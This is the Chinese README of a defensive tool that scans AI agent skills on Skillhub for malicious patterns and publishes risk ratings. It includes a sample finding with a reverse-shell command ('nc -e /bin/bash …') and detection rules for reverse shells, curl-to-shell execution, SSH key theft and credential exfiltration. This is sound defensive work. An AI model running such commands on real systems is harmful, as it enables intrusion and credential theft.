# 🛡️ Skillhub 技能安全审计

AI Agent 技能安全扫描与风险评级平台。对 Skillhub 公开仓库中所有 **14,000+** 技能执行自动化安全扫描，生成风险评级报告，并自动发布到 GitHub Pages。

**站点**: http://pages.789123123.xyz/verifed_claw_skill/

## 功能

- 🔍 **全量安全扫描**: 14,000+ 技能，检测反弹 shell、凭据窃取、挖矿等恶意模式
- 📊 **风险评级**: EXTREME / HIGH / MEDIUM / LOW 四级分类
- 🖥️ **交互式网站**: 搜索、筛选、排序、详情查看
- 📈 **运行详情**: 成功率、文件数、数据量、耗时等统计
- 🔄 **每日自动更新**: Cron 定时任务自动扫描并推送

## 项目结构

```
verifed_claw_skill/
├── scripts/                         # 扫描工具链
│   ├── discover_slugs.py           # 技能发现（2字母穷举）
│   ├── skillhub_full_scan.py       # 全量安全扫描引擎
│   ├── generate_site_data.py       # 生成分片站点数据
│   └── run_audit.sh                # 一键执行（发现→扫描→生成→推送）
├── index.html                       # 主页面
├── css/style.css                    # 暗色主题样式
├── js/app.js                        # 前端逻辑（分片加载+按需详情）
├── data/                            # 审计数据（自动生成）
│   ├── audit-summary.json          # 统计摘要（~0.5KB）
│   ├── audit-1.json ~ audit-N.json # 列表分片（~26KB/个）
│   └── details/                    # EXTREME 技能详情（按需加载）
│       └── {slug}.json
├── .github/workflows/deploy.yml     # GitHub Actions Pages 部署
└── README.md
```

## 快速开始

### 前置条件

- Python 3.8+
- Git（已配置 GitHub 访问）

### 一键执行

```bash
# 完整流程：发现 → 扫描 → 生成数据 → 推送
export GITHUB_PAGES_PAT=ghp_xxxx
bash scripts/run_audit.sh
```

### 分步执行

```bash
# Step 1: 发现全部技能（~676组API调用，约3分钟）
python3 scripts/discover_slugs.py
# → /tmp/skillhub_complete_slugs.json

# Step 2: 全量安全扫描（~15-25分钟）
python3 scripts/skillhub_full_scan.py
# → ~/.openclaw/reports/skillhub-full-scan-YYYYMMDD_HHMMSS.json

# Step 3: 生成分片数据
python3 scripts/generate_site_data.py \
  ~/.openclaw/reports/skillhub-full-scan-latest.json \
  /tmp/verifed_claw_skill/data

# Step 4: 推送到 GitHub Pages
cd /tmp/verifed_claw_skill
git add -A && git commit -m "Scan update" && git push origin main
```

### 选项

```bash
bash scripts/run_audit.sh --scan-only       # 只扫描，不推送
bash scripts/run_audit.sh --generate-only   # 只生成数据
bash scripts/run_audit.sh --push-only       # 只推送已有数据
```

## 数据格式

### 分片方案

⚠️ GitHub Pages 从国内 CDN 访问时，单个文件超过 ~65KB 会被截断。因此采用分片方案：

| 文件类型 | 数量 | 大小 | 用途 |
|---------|------|------|------|
| audit-summary.json | 1 | ~0.5KB | 统计摘要，秒级加载 |
| audit-N.json | ~41 | ~26KB/个 | 列表分片，并行加载 |
| details/{slug}.json | ~643 | ~10KB/个 | EXTREME 详情，按需加载 |

### Summary 结构

```json
{
  "scan_date": "2026-04-11 03:22 CST",
  "scan_duration": "14.5 分钟 (871s)",
  "total": 14028,
  "audited": 14016,
  "failed": 12,
  "total_files": 92457,
  "total_size": 594983773,
  "has_scripts": 6951,
  "has_hooks": 50,
  "risk_counts": {"EXTREME": 643, "HIGH": 10451, "MEDIUM": 711, "LOW": 2211, "UNKNOWN": 12},
  "files": ["audit-1.json", "audit-2.json", ...],
  "detail_count": 643
}
```

### 列表 Chunk 结构

超紧凑格式（字段名缩写）：

```json
[{"s":"slug-name","r":"EXTREME","f":6,"z":35920,"S":1,"c":8,"h":24,"m":35}, ...]
```

| 字段 | 含义 |
|------|------|
| s | slug |
| r | risk_level |
| f | file_count |
| z | total_size (bytes) |
| S | has_scripts (0/1) |
| c | critical findings count |
| h | high findings count |
| m | medium findings count |

### 详情文件结构

```json
{
  "slug": "malicious-skill",
  "name": "Display Name",
  "version": "1.0.0",
  "risk_level": "EXTREME",
  "file_count": 6,
  "total_size": 35920,
  "has_scripts": true,
  "has_hooks": false,
  "has_exec_directives": true,
  "status": "audited",
  "critical": 8,
  "high": 24,
  "medium": 35,
  "findings": [
    {"sev": "CRITICAL", "rule": "reverse_shell", "ctx": "nc -e /bin/bash 192.168.1.1 4444"},
    ...
  ]
}
```

## 扫描规则

### ⛔ EXTREME (CRITICAL)

| 规则 | 模式 | 说明 |
|------|------|------|
| reverse_shell | `nc\s+-[elp]` | 反弹 shell |
| remote_exec_pipe | `(curl\|wget).*\|(sh\|bash)` | 远程执行 |
| ssh_key_theft | `(cat\|cp).*id_rsa` | SSH 密钥窃取 |
| system_file_modify | `/etc/(passwd\|sudoers)` | 系统文件修改 |
| crypto_mining | `stratum+tcp\|xmrig` | 挖矿 |
| credential_exfil | `curl.*id_rsa\|\.env` | 凭证外传 |
| base64_payload | `base64.*-d.*\|(sh\|eval)` | Base64 编码载荷 |

### 🔴 HIGH

| 规则 | 模式 | 说明 |
|------|------|------|
| unknown_external_url | 非白名单域名 | 未知外部服务器 |
| env_var_read | `os.environ\|process.env` | 环境变量读取 |
| file_write_system | `writeFile\|fs.write` | 文件写入 |
| unsafe_deserialize | `pickle.loads\|eval(` | 不安全反序列化 |
| shell_config_modify | `.bashrc\|.zshrc` | Shell 配置修改 |
| sudo_required | `\bsudo\b` | 需要提权 |
| eval_with_input | `eval.*\$(.*input` | eval 注入 |

### 🟡 MEDIUM

| 规则 | 模式 | 说明 |
|------|------|------|
| systemd_service | `systemd\|launchd` | 系统服务注册 |
| path_manipulation | `PATH=\|export PATH` | PATH 修改 |
| npm_pip_install | `npm\|pip install` | 外部包安装 |

## 注意事项

1. **HIGH 误报率高**: 很多技能文档中提到 `eval()`、外部 URL 是正常的，不代表有恶意。优先审查 EXTREME 级别技能。
2. **分片大小限制**: 列表分片必须控制在 ~26KB（350条/chunk），否则国内 CDN 会截断。
3. **网络依赖**: 扫描需要访问 `lightmake.site` 下载技能包。
4. **Git 历史大文件**: 早期提交过 76MB 的 JSON 文件，如需清理历史可使用 `git filter-branch`。

## 部署

项目使用 GitHub Pages 自动部署：

1. 推送到 `main` 分支
2. GitHub Actions 自动触发 `.github/workflows/deploy.yml`
3. 部署到 `pages.789123123.xyz/verifed_claw_skill/`

## License

MIT
